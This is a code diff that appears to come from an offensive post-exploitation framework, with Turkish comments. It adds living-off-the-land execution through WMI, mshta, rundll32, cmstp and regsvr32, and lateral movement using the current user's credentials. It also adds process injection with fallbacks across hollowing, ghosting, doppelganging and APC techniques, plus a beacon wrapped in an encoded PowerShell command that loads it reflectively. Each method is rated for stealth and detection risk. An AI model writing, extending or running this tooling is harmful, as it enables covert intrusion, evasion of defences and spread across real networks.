@@ -26,7 +26,14 @@ except ImportError:
     HAS_REFLECTIVE_LOADER = False
 
 try:
-    from evasion.process_injection import ProcessInjector
+    from evasion.process_injection import (
+        ProcessInjector, 
+        InjectionConfig, 
+        InjectionTechnique, 
+        InjectionResult,
+        inject_with_fallback,
+        get_best_technique,
+    )
     HAS_PROCESS_INJECTION = True
 except ImportError:
     HAS_PROCESS_INJECTION = False
@@ -75,6 +82,20 @@ try:
     HAS_SLEEPMASK = True
 except ImportError:
     HAS_SLEEPMASK = False
+
+# NEW: LOTL Execution modülü
+try:
+    from cybermodules.lotl_execution import (
+        LOTLExecutor,
+        LOTLConfig,
+        LOTLResult,
+        LOLBin,
+        LOLMethod,
+        LateralLOTL,
+    )
+    HAS_LOTL = True
+except ImportError:
+    HAS_LOTL = False
 
 
 class EvasionProfile(Enum):
@@ -847,6 +868,316 @@ kernel32.ResumeThread(hThread)
                 return self._doppelganging_inject(payload, target)
         return None
     
+    # ============================================================
+    # LOTL (Living-off-the-Land) EXECUTION
+    # ============================================================
+    
+    def lotl_execute(self, payload: str, target: str = "", 
+                     lolbin: str = "wmi") -> Dict[str, Any]:
+        """
+        Execute payload using Living-off-the-Land binary
+        
+        Args:
+            payload: Command or shellcode to execute
+            target: Remote target (empty for local)
+            lolbin: LOLBin to use (wmi, rundll32, mshta, cmstp, regsvr32)
+        
+        Returns:
+            Dict: Execution result
+        """
+        result = {
+            "success": False,
+            "method": "lotl",
+            "lolbin": lolbin,
+            "target": target or "localhost",
+            "error": None,
+        }
+        
+        if not HAS_LOTL:
+            result["error"] = "LOTL module not available"
+            return result
+        
+        self._log(f"LOTL execution via {lolbin} -> {target or 'localhost'}")
+        
+        try:
+            lotl_config = LOTLConfig(
+                preferred_bins=[LOLBin(lolbin)],
+                fallback_enabled=True,
+                cleanup_artifacts=True,
+                remote_host=target,
+                use_current_creds=True,
+            )
+            
+            executor = LOTLExecutor(lotl_config)
+            lotl_result = executor.execute(payload, LOLBin(lolbin), target=target)
+            
+            result["success"] = lotl_result.success
+            result["pid"] = lotl_result.pid
+            result["output"] = lotl_result.output
+            result["error"] = lotl_result.error
+            result["detection_risk"] = lotl_result.detection_risk
+            result["artifacts"] = lotl_result.artifacts
+            
+            if lotl_result.success:
+                self._log(f"LOTL execution successful, PID: {lotl_result.pid}")
+            else:
+                self._log(f"LOTL execution failed: {lotl_result.error}")
+            
+            return result
+            
+        except Exception as e:
+            result["error"] = str(e)
+            self._log(f"LOTL execution error: {e}")
+            return result
+    
+    def lotl_lateral_jump(self, target: str, payload: str,
+                          method: str = "wmi") -> Dict[str, Any]:
+        """
+        LOTL ile lateral movement (psexec alternatifi)
+        
+        Args:
+            target: Hedef hostname/IP
+            payload: Çalıştırılacak payload
+            method: LOTL metodu (wmi, rundll32, mshta)
+        
+        Returns:
+            Dict: Jump sonucu
+        """
+        result = {
+            "success": False,
+            "method": f"lotl_{method}",
+            "target": target,
+            "error": None,
+        }
+        
+        if not HAS_LOTL:
+            result["error"] = "LOTL module not available"
+            return result
+        
+        self._log(f"LOTL lateral jump to {target} via {method}")
+        
+        try:
+            lateral_lotl = LateralLOTL()
+            
+            lotl_result = lateral_lotl.lateral_jump(
+                target=target,
+                payload=payload,
+                method=LOLBin(method)
+            )
+            
+            result["success"] = lotl_result.success
+            result["pid"] = lotl_result.pid
+            result["error"] = lotl_result.error
+            
+            if lotl_result.success:
+                self._log(f"Lateral jump successful to {target}")
+            
+            return result
+            
+        except Exception as e:
+            result["error"] = str(e)
+            return result
+    
+    def inject_with_lotl_fallback(self, beacon_payload: bytes,
+                                   target_process: str = None,
+                                   remote_target: str = "") -> Dict[str, Any]:
+        """
+        Injection dene, engellendiyse LOTL'ye düş
+        
+        Args:
+            beacon_payload: Beacon payload
+            target_process: Injection için hedef process
+            remote_target: Uzak hedef (LOTL için)
+        
+        Returns:
+            Dict: Sonuç
+        """
+        result = {
+            "success": False,
+            "method": None,
+            "fallback_used": False,
+            "error": None,
+        }
+        
+        # Step 1: Try injection
+        self._log("Attempting process injection...")
+        
+        if HAS_PROCESS_INJECTION:
+            try:
+                # Use new ProcessInjector with fallback
+                injector = ProcessInjector(InjectionConfig(
+                    technique=InjectionTechnique.EARLY_BIRD_APC,
+                    fallback_enabled=True,
+                ))
+                
+                inject_result = injector.inject_with_fallback(
+                    beacon_payload,
+                    pid=None  # Auto-select target
+                )
+                
+                if inject_result.success:
+                    result["success"] = True
+                    result["method"] = f"injection_{inject_result.technique.value}"
+                    result["pid"] = inject_result.target_pid
+                    result["fallback_used"] = inject_result.fallback_used
+                    return result
+                
+                self._log(f"Injection failed: {inject_result.error}")
+                
+            except Exception as e:
+                self._log(f"Injection error: {e}")
+        
+        # Step 2: Fallback to LOTL
+        self._log("Injection failed, falling back to LOTL...")
+        result["fallback_used"] = True
+        
+        if not remote_target:
+            result["error"] = "LOTL fallback requires remote target"
+            return result
+        
+        # Encode payload for LOTL (e.g., PowerShell download cradle)
+        payload_b64 = base64.b64encode(beacon_payload).decode()
+        lotl_payload = f'powershell -EncodedCommand {base64.b64encode(f"[System.Reflection.Assembly]::Load([Convert]::FromBase64String(\'{payload_b64}\')).EntryPoint.Invoke($null,$null)".encode("utf-16le")).decode()}'
+        
+        lotl_result = self.lotl_lateral_jump(
+            target=remote_target,
+            payload=lotl_payload,
+            method="wmi"
+        )
+        
+        result["success"] = lotl_result["success"]
+        result["method"] = lotl_result["method"]
+        result["error"] = lotl_result.get("error")
+        
+        return result
+    
+    def get_available_lotl_methods(self) -> List[Dict[str, Any]]:
+        """Get list of available LOTL methods with details"""
+        if not HAS_LOTL:
+            return []
+        
+        methods = [
+            {
+                "name": "wmi",
+                "description": "WMI Process Create",
+                "mitre": "T1047",
+                "stealth": 7,
+                "reliability": 9,
+                "requires_creds": True,
+            },
+            {
+                "name": "mshta",
+                "description": "MSHTA JavaScript/VBScript execution",
+                "mitre": "T1218.005",
+                "stealth": 6,
+                "reliability": 8,
+                "requires_creds": False,
+            },
+            {
+                "name": "rundll32",
+                "description": "rundll32 DLL/JS execution",
+                "mitre": "T1218.011",
+                "stealth": 5,
+                "reliability": 8,
+                "requires_creds": False,
+            },
+            {
+                "name": "cmstp",
+                "description": "CMSTP INF install (UAC bypass)",
+                "mitre": "T1218.003",
+                "stealth": 7,
+                "reliability": 7,
+                "requires_creds": False,
+            },
+            {
+                "name": "regsvr32",
+                "description": "regsvr32 SCT execution",
+                "mitre": "T1218.010",
+                "stealth": 6,
+                "reliability": 7,
+                "requires_creds": False,
+            },
+        ]
+        
+        return methods
+    
+    # ============================================================
+    # ADVANCED INJECTION WITH NEW ProcessInjector
+    # ============================================================
+    
+    def advanced_inject(self, shellcode: bytes, 
+                        technique: str = "early_bird_apc",
+                        pid: int = None) -> Dict[str, Any]:
+        """
+        Advanced injection using new ProcessInjector
+        
+        Args:
+            shellcode: Shellcode to inject
+            technique: Injection technique name
+            pid: Target PID (None for auto-select)
+        
+        Returns:
+            Dict: Injection result
+        """
+        result = {
+            "success": False,
+            "technique": technique,
+            "pid": None,
+            "error": None,
+        }
+        
+        if not HAS_PROCESS_INJECTION:
+            result["error"] = "Process injection module not available"
+            return result
+        
+        try:
+            # Map technique string to enum
+            technique_map = {
+                "classic_crt": InjectionTechnique.CLASSIC_CRT,
+                "early_bird_apc": InjectionTechnique.EARLY_BIRD_APC,
+                "thread_hijack": InjectionTechnique.THREAD_HIJACK,
+                "process_hollowing": InjectionTechnique.PROCESS_HOLLOWING,
+                "module_stomping": InjectionTechnique.MODULE_STOMPING,
+                "ghosting": InjectionTechnique.PROCESS_GHOSTING,
+                "doppelganging": InjectionTechnique.PROCESS_DOPPELGANGING,
+                "transacted_hollowing": InjectionTechnique.TRANSACTED_HOLLOWING,
+                "phantom_dll": InjectionTechnique.PHANTOM_DLL,
+                "syscall": InjectionTechnique.SYSCALL_INJECTION,
+            }
+            
+            injection_technique = technique_map.get(
+                technique, 
+                InjectionTechnique.EARLY_BIRD_APC
+            )
+            
+            config = InjectionConfig(
+                technique=injection_technique,
+                fallback_enabled=self.config.profile == EvasionProfile.PARANOID,
+                use_syscalls=True,
+            )
+            
+            injector = ProcessInjector(config)
+            
+            if config.fallback_enabled:
+                inject_result = injector.inject_with_fallback(shellcode, pid)
+            else:
+                inject_result = injector._execute_technique(
+                    injection_technique, shellcode, pid or 0
+                )
+            
+            result["success"] = inject_result.success
+            result["technique"] = inject_result.technique.value
+            result["pid"] = inject_result.target_pid
+            result["error"] = inject_result.error
+            result["evasion_score"] = inject_result.evasion_score
+            result["fallback_used"] = inject_result.fallback_used
+            
+            return result
+            
+        except Exception as e:
+            result["error"] = str(e)
+            return result
+
     def evasive_sleep(self, base_duration_ms: int = None) -> int:
         """
         Sleep with obfuscation, jitter, and entropy
